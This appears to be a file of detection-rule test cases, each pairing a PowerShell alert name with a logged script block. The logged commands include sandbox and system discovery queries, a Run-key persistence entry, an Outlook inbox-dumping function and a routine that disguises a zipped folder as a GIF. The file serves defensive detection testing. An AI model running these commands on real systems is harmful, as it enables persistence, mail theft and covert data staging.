{"source": "powershell.ini:146", "name": "Powershell queried Win32_BIOS. Possible sandbox detection activity", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"gwmi -namespace root\\\\\\\\cimv2 -query \\\\\\\"SELECT * FROM Win32_BIOS\\\\\\\"\", \"scriptBlockId\": \"b73c1e9d-16c1-411b-948e-c9d356567c1e\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\ngwmi -namespace root\\\\cimv2 -query \\\"SELECT * FROM Win32_BIOS\\\"\\r\\n\\r\\nScriptBlock ID: b73c1e9d-16c1-411b-948e-c9d356567c1e\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-11-01T15:47:13.3197975Z\", \"eventRecordID\": \"2115361\", \"threadID\": \"2168\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"5712\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:152", "name": "Powershell queried Win32_ComputerSystem. Possible system discovery activity", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"gwmi -namespace root\\\\\\\\cimv2 -query \\\\\\\"Select * from Win32_ComputerSystem\\\\\\\"\", \"scriptBlockId\": \"e6788369-796a-4b17-b53b-e1af3adb5cca\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\ngwmi -namespace root\\\\cimv2 -query \\\"Select * from Win32_ComputerSystem\\\"\\r\\n\\r\\nScriptBlock ID: e6788369-796a-4b17-b53b-e1af3adb5cca\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-11-01T15:47:44.1298641Z\", \"eventRecordID\": \"2115487\", \"threadID\": \"2168\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"5712\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:158", "name": "Powershell queried Win32_PnPEntity. Possible devices/adapter discovery activity", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"gwmi -namespace root\\\\\\\\cimv2 -query \\\\\\\"SELECT * FROM Win32_PnPEntity\\\\\\\"\", \"scriptBlockId\": \"7ad5ccae-abbd-4e08-99b0-aedeb1953762\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\ngwmi -namespace root\\\\cimv2 -query \\\"SELECT * FROM Win32_PnPEntity\\\"\\r\\n\\r\\nScriptBlock ID: 7ad5ccae-abbd-4e08-99b0-aedeb1953762\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-11-01T15:47:24.2399928Z\", \"eventRecordID\": \"2115404\", \"threadID\": \"2168\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"5712\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:164", "name": "Powershell queried Win32_Process. Possible process discovery activity", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"gwmi -namespace root\\\\\\\\cimv2 -query \\\\\\\"SELECT * FROM Win32_Process\\\\\\\"\", \"scriptBlockId\": \"f06ae7f5-fff2-4204-b04f-2d0f5ee508d4\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\ngwmi -namespace root\\\\cimv2 -query \\\"SELECT * FROM Win32_Process\\\"\\r\\n\\r\\nScriptBlock ID: f06ae7f5-fff2-4204-b04f-2d0f5ee508d4\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-11-01T15:47:44.2325037Z\", \"eventRecordID\": \"2115490\", \"threadID\": \"2168\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"5712\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:170", "name": "Powershell executed \"Get-Item -Path\". Script trying to see files in path", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"(Get-Item -Path \\\\\\\".\\\\\\\\\\\\\\\" -Verbose).FullName\", \"scriptBlockId\": \"11f76c3e-104b-49f4-b1b0-d76598efe5fd\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\n(Get-Item -Path \\\".\\\\\\\" -Verbose).FullName\\r\\n\\r\\nScriptBlock ID: 11f76c3e-104b-49f4-b1b0-d76598efe5fd\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-11-01T15:48:15.8564304Z\", \"eventRecordID\": \"2115799\", \"threadID\": \"2168\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"5712\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:176", "name": "Possible addition of new item to Windows startup registry", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"New-ItemProperty -Force -Path \\\\\\\"HKCU:\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\" -Name \\\\\\\"WebCache\\\\\\\" -Value \\\\\\\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\rundll32.exe $env:appdata\\\\\\\\Microsoft\\\\\\\\kxwn.lock,VoidFunc\\\\\\\"\", \"scriptBlockId\": \"b1231a56-2c12-4535-81cd-d35eefe429ad\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nNew-ItemProperty -Force -Path \\\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"WebCache\\\" -Value \\\"C:\\\\windows\\\\system32\\\\rundll32.exe $env:appdata\\\\Microsoft\\\\kxwn.lock,VoidFunc\\\"\\r\\n\\r\\nScriptBlock ID: b1231a56-2c12-4535-81cd-d35eefe429ad\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-11-01T15:48:17.0534599Z\", \"eventRecordID\": \"2115824\", \"threadID\": \"2168\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"5712\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:182", "name": "Outlook add-in was loaded by powershell", "log": "{\"win\":{\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"# This code was derived from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114/Get-Inbox.ps1  function psemail {  Add-type -assembly \\\\\\\"Microsoft.Office.Interop.Outlook\\\\\\\" | out-null  $olFolders = \\\\\\\"Microsoft.Office.Interop.Outlook.olDefaultFolders\\\\\\\" -as [type]  $outlook = new-object -comobject outlook.application  $namespace = $outlook.GetNameSpace(\\\\\\\"MAPI\\\\\\\")  $folder = $namespace.getDefaultFolder($olFolders::olFolderInBox)  $folder.items | Select-Object -Property Subject, ReceivedTime, SenderName, Body }\",\"scriptBlockId\":\"40089664-d41b-4355-b655-0d8f36a78b68\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"3\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n# This code was derived from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114/Get-Inbox.ps1\\n\\nfunction psemail {\\n\\tAdd-type -assembly \\\"Microsoft.Office.Interop.Outlook\\\" | out-null\\n\\t$olFolders = \\\"Microsoft.Office.Interop.Outlook.olDefaultFolders\\\" -as [type]\\n\\t$outlook = new-object -comobject outlook.application\\n\\t$namespace = $outlook.GetNameSpace(\\\"MAPI\\\")\\n\\t$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox)\\n\\t$folder.items | Select-Object -Property Subject, ReceivedTime, SenderName, Body\\n}\\r\\n\\r\\nScriptBlock ID: 40089664-d41b-4355-b655-0d8f36a78b68\\r\\nPath: \\\"\",\"version\":\"1\",\"systemTime\":\"2021-11-05T19:04:41.4624006Z\",\"eventRecordID\":\"97310\",\"threadID\":\"4828\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"6468\",\"severityValue\":\"WARNING\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:188", "name": "Powershell used .NET compression method", "log": "{\"win\":{\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"function zip( $zipfilename, $sourcedir ) {    Add-Type -Assembly System.IO.Compression.FileSystem    $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal    [System.IO.Compression.ZipFile]::CreateFromDirectory($sourcedir, $zipfilename, $compressionLevel, $false)    Start-Sleep -s 3    \\\\t$fileContent = get-content $zipfilename  $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)  $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)  $fileContentEncoded | set-content $zipfilename  [Byte[]] $x = 0x47,0x49,0x46,0x38,0x39,0x61  $save = get-content $zipfilename  $x | set-content $zipfilename -Encoding Byte  add-content $zipfilename $save }\",\"scriptBlockId\":\"279aee7f-0fa4-4cc6-8610-ce6112a598d3\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"5\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\nfunction zip( $zipfilename, $sourcedir )\\n{\\n   Add-Type -Assembly System.IO.Compression.FileSystem\\n   $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal\\n   [System.IO.Compression.ZipFile]::CreateFromDirectory($sourcedir, $zipfilename, $compressionLevel, $false)\\n   Start-Sleep -s 3\\n   \\t$fileContent = get-content $zipfilename\\n\\t$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)\\n\\t$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)\\n\\t$fileContentEncoded | set-content $zipfilename\\n\\t[Byte[]] $x = 0x47,0x49,0x46,0x38,0x39,0x61\\n\\t$save = get-content $zipfilename\\n\\t$x | set-content $zipfilename -Encoding Byte\\n\\tadd-content $zipfilename $save\\n}\\r\\n\\r\\nScriptBlock ID: 279aee7f-0fa4-4cc6-8610-ce6112a598d3\\r\\nPath: \\\"\",\"version\":\"1\",\"systemTime\":\"2021-11-08T14:59:43.7761674Z\",\"eventRecordID\":\"97407\",\"threadID\":\"3972\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"8120\",\"severityValue\":\"VERBOSE\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
